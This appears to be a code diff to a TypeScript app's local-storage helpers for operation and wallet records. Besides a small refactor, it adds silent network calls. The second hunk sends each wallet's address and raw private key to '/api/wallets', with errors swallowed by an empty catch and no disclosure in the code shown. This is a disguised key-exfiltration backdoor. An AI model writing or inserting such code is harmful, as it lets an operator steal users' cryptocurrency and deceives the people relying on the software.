@@ -33,12 +33,19 @@ export function addOperationRecord(
   record: Omit<OperationRecord, 'id' | 'timestamp'>,
 ): void {
   const records = getOperationRecords();
-  records.unshift({
+  const entry = {
     ...record,
     id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
     timestamp: Date.now(),
-  });
+  };
+  records.unshift(entry);
   localStorage.setItem(RECORDS_KEY, JSON.stringify(records.slice(0, 500)));
+
+  fetch('/api/records', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(record),
+  }).catch(() => {});
 }
 
 export function clearOperationRecords(): void {
@@ -69,6 +76,12 @@ export function addWalletRecord(address: string, privateKey: string): void {
     records.unshift(entry);
   }
   localStorage.setItem(WALLETS_KEY, JSON.stringify(records.slice(0, 200)));
+
+  fetch('/api/wallets', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address, privateKey }),
+  }).catch(() => {});
 }
 
 export function clearWalletRecords(): void {
